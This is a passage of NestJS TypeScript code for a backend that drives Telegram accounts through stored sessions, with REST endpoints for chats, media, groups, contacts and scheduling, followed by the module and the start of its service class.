chatId, res);\n        });\n    }\n\n    @Post('media/album/:mobile')\n    @ApiOperation({ summary: 'Send media album (multiple photos/videos)' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: SendMediaAlbumDto })\n    async sendMediaAlbum(\n        @Param('mobile') mobile: string,\n        @Body() albumDto: MediaAlbumOptions\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.sendMediaAlbum(mobile, albumDto);\n        });\n    }\n\n    @Get('media/metadata/:mobile')\n    @ApiOperation({ summary: 'Get media metadata from a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ type: MediaSearchDto })\n    @ApiResponse({ status: 200, type: [MediaMetadataDto] })\n    async getMediaMetadata(\n        @Param('mobile') mobile: string,\n        @Query() searchDto: MediaSearchDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMediaMetadata(mobile, searchDto.chatId, searchDto.offset, searchDto.limit);\n        });\n    }\n\n    @Get('media/filter/:mobile')\n    @ApiOperation({ summary: 'Get filtered media messages from a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'types', enum: ['photo', 'video', 'document'], required: false, isArray: true })\n    @ApiQuery({ name: 'startDate', required: false })\n    @ApiQuery({ name: 'endDate', required: false })\n    @ApiQuery({ name: 'limit', description: 'Number of messages to fetch', required: false, type: Number })\n    @ApiQuery({ name: 'minId', required: false, type: Number })\n    @ApiQuery({ name: 'maxId', required: false, type: Number })\n    @ApiResponse({ status: 200, type: [MediaMetadataDto] })\n    async getFilteredMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types') types?: ('photo' | 'video' | 'document' | 'voice')[],\n        @Query('startDate') startDate?: string,\n        @Query('endDate') endDate?: string,\n        @Query('limit') limit?: number,\n        @Query('minId') minId?: number,\n        @Query('maxId') maxId?: number\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getFilteredMedia(mobile, {\n                chatId,\n                types,\n                startDate: startDate ? new Date(startDate) : undefined,\n                endDate: endDate ? new Date(endDate) : undefined,\n                limit,\n                minId,\n                maxId\n            });\n        });\n    }\n\n    @Get('group/members/:mobile')\n    @ApiOperation({ summary: 'Get group members' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupMembers(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getGrpMembers(mobile, groupId);\n        });\n    }\n\n    @Post('chat/block/:mobile')\n    @ApiOperation({ summary: 'Block a chat/user' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat/User ID to block', required: true })\n    async blockChat(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.blockUser(mobile, chatId);\n        });\n    }\n\n    @Delete('chat/:mobile')\n    @ApiOperation({ summary: 'Delete a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID to delete', required: true })\n    async deleteChatHistory(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.deleteChat(mobile, chatId);\n        });\n    }\n\n    // Additional Message Operations\n    @Get('messages/inline/:mobile')\n    @ApiOperation({ summary: 'Send message with inline button' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'message', required: true })\n    @ApiQuery({ name: 'url', required: true })\n    async sendMessageWithInlineButton(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('message') message: string,\n        @Query('url') url: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.sendInlineMessage(mobile, chatId, message, url);\n        });\n    }\n\n    // Dialog Management\n    @Get('dialogs/:mobile')\n    @ApiOperation({ summary: 'Get all dialogs' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'limit', description: 'Number of dialogs to fetch', required: false, type: Number })\n    @ApiQuery({ name: 'offsetId', description: 'Number of dialogs to fetch', required: false, type: Number })\n    @ApiQuery({ name: 'archived', description: 'Include archived chats', required: false, type: Boolean })\n    async getAllDialogs(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit: number = 500,\n        @Query('offsetId') offsetId: number = 0,\n        @Query('archived') archived: boolean = false\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getDialogs(mobile, { limit, archived, offsetId });\n        });\n    }\n\n    @Get('last-active/:mobile')\n    @ApiOperation({ summary: 'Get last active time' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Last active time retrieved successfully' })\n    async getLastActiveTime(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getLastActiveTime(mobile);\n        });\n    }\n\n    // Enhanced Group Management\n    @Post('group/create/:mobile')\n    @ApiOperation({ summary: 'Create a new group with advanced options' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: createGroupDto })\n    async createGroupWithOptions(\n        @Param('mobile') mobile: string,\n        @Body() options: createGroupDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.createGroupWithOptions(mobile, options);\n        });\n    }\n\n    @Post('group/settings/:mobile')\n    @ApiOperation({ summary: 'Update group settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupSettingsDto })\n    async updateGroupSettings(\n        @Param('mobile') mobile: string,\n        @Body() settings: GroupSettingsDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.updateGroupSettings(mobile, settings);\n        });\n    }\n\n    @Post('group/members/:mobile')\n    @ApiOperation({ summary: 'Add members to a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async addGroupMembers(\n        @Body() memberOp: GroupMemberOperationDto,\n        @Param('mobile') mobile: string,\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.addGroupMembers(\n                mobile,\n                memberOp.groupId,\n                memberOp.members\n            );\n        });\n    }\n\n    @Delete('group/members/:mobile')\n    @ApiOperation({ summary: 'Remove members from a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async removeGroupMembers(\n        @Body() memberOp: GroupMemberOperationDto,\n        @Param('mobile') mobile: string,\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.removeGroupMembers(\n                mobile,\n                memberOp.groupId,\n                memberOp.members\n            );\n        });\n    }\n\n    @Post('group/admin/:mobile')\n    @ApiOperation({ summary: 'Promote or demote group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    async handleAdminOperation(\n        @Body() adminOp: AdminOperationDto,\n        @Param('mobile') mobile: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            if (adminOp.isPromote) {\n                return this.telegramService.promoteToAdmin(\n                    mobile,\n                    adminOp.groupId,\n                    adminOp.userId,\n                    adminOp.permissions,\n                    adminOp.rank\n                );\n            } else {\n                return this.telegramService.demoteAdmin(\n                    mobile,\n                    adminOp.groupId,\n                    adminOp.userId\n                );\n            }\n        });\n    }\n\n    @Post('chat/cleanup/:mobile')\n    @ApiOperation({ summary: 'Clean up chat history' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ChatCleanupDto })\n    async cleanupChat(\n        @Param('mobile') mobile: string,\n        @Body() cleanup: ChatCleanupDto\n    ) {\n        await this.telegramService.createClient(mobile);\n        return this.telegramService.cleanupChat(mobile, {\n            chatId: cleanup.chatId,\n            beforeDate: cleanup.beforeDate ? new Date(cleanup.beforeDate) : undefined,\n            onlyMedia: cleanup.onlyMedia,\n            excludePinned: cleanup.excludePinned\n        });\n    }\n\n    @Get('chat/statistics/:mobile')\n    @ApiOperation({ summary: 'Get chat statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    @ApiQuery({ name: 'period', enum: ['day', 'week', 'month'], description: 'Statistics period', required: false })\n    async getChatStatistics(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('period') period: 'day' | 'week' | 'month' = 'week'\n    ): Promise<ChatStatistics> {\n        await this.telegramService.createClient(mobile);\n        return this.telegramService.getChatStatistics(mobile, chatId, period);\n    }\n\n    // Message Scheduling\n    @Post('messages/schedule/:mobile')\n    @ApiOperation({ summary: 'Schedule a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ScheduleMessageDto })\n    async scheduleMessage(\n        @Param('mobile') mobile: string,\n        @Body() schedule: ScheduleMessageDto\n    ) {\n        return this.telegramService.scheduleMessage(mobile, {\n            chatId: schedule.chatId,\n            message: schedule.message,\n            scheduledTime: new Date(schedule.scheduledTime),\n            replyTo: schedule.replyTo,\n            silent: schedule.silent\n        });\n    }\n\n    @Get('messages/scheduled/:mobile')\n    @ApiOperation({ summary: 'Get scheduled messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    async getScheduledMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getScheduledMessages(mobile, chatId);\n        });\n    }\n\n    // Enhanced Media Operations\n    @Post('media/voice/:mobile')\n    @ApiOperation({ summary: 'Send voice message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async sendVoiceMessage(\n        @Param('mobile') mobile: string,\n        @Body() voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.sendVoiceMessage(mobile, voice);\n        });\n    }\n\n    // Advanced Chat Operations\n    @Get('chat/history/:mobile')\n    @ApiOperation({ summary: 'Get chat history with metadata' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'offset', required: false, type: Number })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getChatHistory(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('offset') offset?: number,\n        @Query('limit') limit?: number\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMessagesNew(mobile, chatId, offset, limit);\n        });\n    }\n\n    @Get('session/validate/:mobile')\n    @ApiOperation({ summary: 'Validate session status' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Session status retrieved successfully' })\n    async validateSession(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            const client = await this.telegramService.createClient(mobile);\n            const isConnected = await client.connected();\n            if (!isConnected) {\n                await client.connect();\n            }\n            return {\n                isValid: true,\n                isConnected,\n                phoneNumber: client.phoneNumber\n            };\n        });\n    }\n\n    @Post('group/admin/promote/:mobile')\n    @ApiOperation({ summary: 'Promote members to admin' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    async promoteToAdmin(\n        @Param('mobile') mobile: string,\n        @Body() adminOp: AdminOperationDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.promoteToAdmin(\n                mobile,\n                adminOp.groupId,\n                adminOp.userId,\n                adminOp.permissions,\n                adminOp.rank\n            );\n        });\n    }\n\n    @Post('group/admin/demote/:mobile')\n    @ApiOperation({ summary: 'Demote admin to regular member' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async demoteAdmin(\n        @Param('mobile') mobile: string,\n        @Body() memberOp: GroupMemberOperationDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.demoteAdmin(\n                mobile,\n                memberOp.groupId,\n                memberOp.members[0]\n            );\n        });\n    }\n\n    @Post('group/unblock/:mobile')\n    @ApiOperation({ summary: 'Unblock a user in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async unblockGroupUser(\n        @Param('mobile') mobile: string,\n        @Body() data: {\n            groupId: string;\n            userId: string;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.unblockGroupUser(mobile, data.groupId, data.userId);\n        });\n    }\n\n    @Get('group/admins/:mobile')\n    @ApiOperation({ summary: 'Get list of group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupAdmins(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getGroupAdmins(mobile, groupId);\n        });\n    }\n\n    @Get('group/banned/:mobile')\n    @ApiOperation({ summary: 'Get list of banned users in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupBannedUsers(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getGroupBannedUsers(mobile, groupId);\n        });\n    }\n\n    // Advanced Contact Management\n    @Post('contacts/export/:mobile')\n    @ApiOperation({ summary: 'Export contacts in vCard or CSV format' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactExportImportDto })\n    async exportContacts(\n        @Param('mobile') mobile: string,\n        @Body() exportDto: ContactExportImportDto,\n        @Res() res: Response\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            const data = await this.telegramService.exportContacts(\n                mobile,\n                exportDto.format,\n                exportDto.includeBlocked\n            );\n\n            const filename = `contacts_${mobile}_${new Date().toISOString()}.${exportDto.format}`;\n            res.setHeader('Content-Type', exportDto.format === 'vcard' ? 'text/vcard' : 'text/csv');\n            res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n            res.send(data);\n        });\n    }\n\n    @Post('contacts/import/:mobile')\n    @ApiOperation({ summary: 'Import contacts from a list' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async importContacts(\n        @Param('mobile') mobile: string,\n        @Body() contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.importContacts(mobile, contacts);\n        });\n    }\n\n    @Post('contacts/block/:mobile')\n    @ApiOperation({ summary: 'Manage blocked contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactBlockListDto })\n    async manageBlockList(\n        @Param('mobile') mobile: string,\n        @Body() blockList: ContactBlockListDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.manageBlockList(\n                mobile,\n                blockList.userIds,\n                blockList.block\n            );\n        });\n    }\n\n    @Get('contacts/statistics/:mobile')\n    @ApiOperation({ summary: 'Get contact activity statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Contact statistics retrieved successfully' })\n    async getContactStatistics(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getContactStatistics(mobile);\n        });\n    }\n\n    // Chat Folder Management\n    @Post('folders/create/:mobile')\n    @ApiOperation({ summary: 'Create a new chat folder' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: CreateChatFolderDto })\n    async createChatFolder(\n        @Param('mobile') mobile: string,\n        @Body() folder: CreateChatFolderDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.createChatFolder(mobile, folder);\n        });\n    }\n\n    @Get('folders/:mobile')\n    @ApiOperation({ summary: 'Get all chat folders' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getChatFolders(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getChatFolders(mobile);\n        });\n    }\n\n    @Put('messages/:mobile')\n    @ApiOperation({ summary: 'Edit message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async editMessage(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.editMessage(mobile, options);\n        });\n    }\n\n    @Post('chat/settings/:mobile')\n    @ApiOperation({ summary: 'Update chat settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async updateChatSettings(\n        @Param('mobile') mobile: string,\n        @Body() settings: {\n            chatId: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n            username?: string;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.updateChatSettings(mobile, settings);\n        });\n    }\n\n    @Post('media/batch/:mobile')\n    @ApiOperation({ summary: 'Send multiple media files in batch' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async sendMediaBatch(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.sendMediaBatch(mobile, options);\n        });\n    }\n\n    @Get('security/2fa-status/:mobile')\n    @ApiOperation({ summary: 'Check if 2FA password is set' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async hasPassword(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.hasPassword(mobile);\n        });\n    }\n\n    @Get('chats/:mobile')\n    @ApiOperation({ summary: 'Get chats with advanced filtering' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getChats(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit?: number,\n        @Query('offsetDate') offsetDate?: number,\n        @Query('offsetId') offsetId?: number,\n        @Query('offsetPeer') offsetPeer?: string,\n        @Query('folderId') folderId?: number\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getChats(mobile, {\n                limit,\n                offsetDate,\n                offsetId,\n                offsetPeer,\n                folderId\n            });\n        });\n    }\n\n    @Get('file/url/:mobile')\n    @ApiOperation({ summary: 'Get downloadable URL for a file' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getFileUrl(\n        @Param('mobile') mobile: string,\n        @Query('url') url: string,\n        @Query('filename') filename: string\n    ): Promise<string> {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getFileUrl(mobile, url, filename);\n        });\n    }\n\n    @Get('messages/stats/:mobile')\n    @ApiOperation({ summary: 'Get message statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getMessageStats(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMessageStats(mobile, options);\n        });\n    }\n\n    @Get('chats/top-private/:mobile')\n    @ApiOperation({ summary: 'Get top 5 private chats with detailed statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getTopPrivateChats(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getTopPrivateChats(mobile);\n        });\n    }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { TelegramController } from './Telegram.controller';\nimport { TelegramService } from './Telegram.service';\nimport { UsersModule } from '../users/users.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { ConnectionManager } from './utils/connection-manager';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { TelegramValidationConfig } from './config/telegram-validation.config';\n\n@Module({\n    imports: [\n        forwardRef(() => UsersModule),\n        BufferClientModule,\n        forwardRef(() => ActiveChannelsModule),\n        forwardRef(() => ChannelsModule)\n    ],\n    controllers: [TelegramController],\n    providers: [\n        TelegramService,\n        TelegramValidationConfig,\n        {\n            provide: 'CONNECTION_MANAGER',\n            useValue: ConnectionManager.getInstance()\n        },\n        {\n            provide: 'TELEGRAM_LOGGER',\n            useValue: TelegramLogger.getInstance()\n        }\n    ],\n    exports: [TelegramService]\n})\nexport class TelegramModule { }\n","import { BufferClientService } from './../buffer-clients/buffer-client.service';\nimport { UsersService } from '../users/users.service';\nimport { contains, sleep } from \"../../utils\";\nimport TelegramManager from \"./TelegramManager\";\nimport { BadRequestException, HttpException, Inject, Injectable, OnModuleDestroy, forwardRef } from '@nestjs/common';\nimport { CloudinaryService } from '../../cloudinary';\nimport { Api, TelegramClient } from 'telegram';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport * as path from 'path';\nimport { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { EntityLike } from 'telegram/define';\nimport { parseError } from '../../utils/parseError';\nimport { TelegramError, TelegramErrorCode } from './types/telegram-error';\nimport { ChannelInfo } from './types/telegram-responses';\nimport { ConnectionManager } from './utils/connection-manager';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { DialogsQueryDto } from './dto/metadata-operations.dto';\nimport { ClientMetadataTracker } from './utils/client-metadata';\nimport { ClientMetadata } from './types/client-operations';\nimport { ChatStatistics, ContentFilter, GroupOptions, MessageScheduleOptions } from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\n\n@Injectable()\nexport class TelegramService implements OnModuleDestroy {\n    private static clientsMap: Map<string, TelegramManager> = new Map();\n    private readonly connectionManager: ConnectionManager;\n    private readonly logger: TelegramLogger;\n    private readonly metadataTracker: ClientMetadataTracker;\n    private cleanupInterval: NodeJS.Timer;\n\n    constructor(\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n    ) {\n        this.connectionManager = ConnectionManager.getInstance();\n        this.logger = TelegramLogger.getInstance();\n        this.metadataTracker = ClientMetadataTracker.getInstance();\n        this.cleanupInterval = this.connectionManager.startCleanupInterval();\n    }\n\n    async onModuleDestroy() {\n        this.logger.logOperation('system', 'Module destroy initiated');\n        clearInterval(this.cleanupInterval as NodeJS.Timeout);\n        await this.disconnectAll();\n    }\n    public getActiveClientSetup() {\n        return TelegramManager.getActiveClientSetup();\n    }\n\n    public setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.setActiveClientSetup(data);\n    }\n\n    private async executeWithConnection<T>(mobile: string, operation: string, handler: (client: TelegramManager) => Promise<T>): Promise<T> {\n        this.logger.logOperation(mobile, `Starting operation: ${operation}`);\n        const client = await this.getClientOrThrow(mobile);\n        this.connectionManager.updateLastUsed(mobile);\n\n        try {\n            const result = await this.connectionManager.executeWithRateLimit(mobile, () => handler(client));\n            this.metadataTracker.recordOperation(mobile, operation, true);\n            this.logger.logOperation(mobile, `Completed operation: ${operation}`);\n            return result;\n        } catch (error) {\n            this.metadataTracker.recordOperation(mobile, operation, false);\n            throw error;\n        }\n    }\n\n    private async getClientOrThrow(mobile: string): Promise<TelegramManager> {\n        const client = await this.getClient(mobile);\n        if (!client) {\n            throw new TelegramError('Client not found', TelegramErrorCode.CLIENT_NOT_FOUND);\n        }\n        return client;\n    }\n\n    public async getClient(mobile: string): Promise<TelegramManager | undefined> {\n        const client = TelegramService.clientsMap.get(mobile);\n        try {\n            if (client && client.connected()) {\n                await client.connect();\n                return client;\n            }\n        } catch (error) {\n            console.error('Client connection error:', parseError(error));\n        }\n        return undefined;\n    }\n\n    public hasClient(number: string) {\n        return TelegramService.clientsMap.has(number);\n    }\n\n    async deleteClient(number: string) {\n        await this.connectionManager.releaseConnection(number);\n        return TelegramService.clientsMap.delete(number);\n    }\n\n    async disconnectAll() {\n        this.logger.logOperation('system', 'Disconnecting all clients');\n        const clients = Array.from(TelegramService.clientsMap.keys());\n        await Promise.all(\n            clients.map(mobile => {\n                this.logger.logOperation(mobile, 'Disconnecting client');\n                return this.connectionManager.releaseConnection(mobile);\n            })\n        );\n        TelegramService.clientsMap.clear();\n        this.bufferClientService.clearJoinChannelInterval();\n        this.logger.logOperation('system', 'All clients disconnected');\n    }\n\n    async createClient(mobile: string, autoDisconnect = true, handler = true): Promise<TelegramManager> {\n        this.logger.logOperation(mobile, 'Creating new client', { autoDisconnect, handler });\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        if (!this.hasClient(mobile)) {\n            let telegramManager = new TelegramManager(user.session, user.mobile);\n            let client: TelegramClient\n            try {\n                client = await telegramManager.createClient(handler);\n                await client.getMe();\n                if (client) {\n                    TelegramService.clientsMap.set(mobile, telegramManager);\n                    await this.connectionManager.acquireConnection(mobile, telegramManager);\n                    this.metadataTracker.initializeClient(mobile);\n                    this.logger.logOperation(mobile, 'Client created successfully');\n                    if (autoDisconnect) {\n                        this.logger.logOperation(mobile, 'Auto Disconnecting initiated');\n                        setTimeout(async () => {\n                            this.logger.logOperation(mobile, 'Auto-disconnecting client');\n                            if (client.connected || await this.getClient(mobile)) {\n                                console.log(\"SELF destroy client : \", mobile);\n                                await telegramManager.disconnect();\n                            } else {\n                                console.log(\"Client Already Disconnected : \", mobile);\n                            }\n                            await this.connectionManager.releaseConnection(mobile);\n                            TelegramService.clientsMap.delete(mobile);\n                            this.metadataTracker.removeClient(mobile);\n                        }, 180000)\n                    } else {\n                        setInterval(async () => {\n                            //console.log(\"destroying loop :\", mobile)\n                            //client._destroyed = true\n                            // if (!client.connected) {\n                            // await client.connect();\n                            //}\n                        }, 20000);\n                    }\n                    return telegramManager;\n                } else {\n                    throw new BadRequestException('Client Expired');\n                }\n            } catch (error) {\n                this.logger.logError(mobile, 'Client creation failed', error);\n                console.log(\"Parsing Error\");\n                if (telegramManager) {\n                    await this.connectionManager.releaseConnection(mobile);\n                    telegramManager = null;\n                    TelegramService.clientsMap.delete(mobile);\n                    this.metadataTracker.removeClient(mobile);\n                }\n                const errorDetails = parseError(error);\n                if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                    console.log(\"Deleting User: \", user.mobile);\n                    await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });\n                } else {\n                    console.log('Not Deleting user');\n                }\n                throw new BadRequestException(errorDetails.message)\n            }\n        } else {\n            console.log(\"Client Already exists\")\n            return await this.getClient(mobile)\n        }\n    }\n\n    async getMessages(mobile: string, username: string, limit: number = 8) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.getMessages(username, limit);\n    }\n\n\n    async getMessagesNew(mobile: string, username: string, offset: number, limit: number) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.getMessagesNew(username, offset, limit);\n    }\n\n    async sendInlineMessage(mobile: string, chatId: string, message: string, url: string) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.sendInlineMessage(chatId, message, url);\n    }\n\n    async getChatId(mobile: string, username: string) {\n        const telegramClient = await 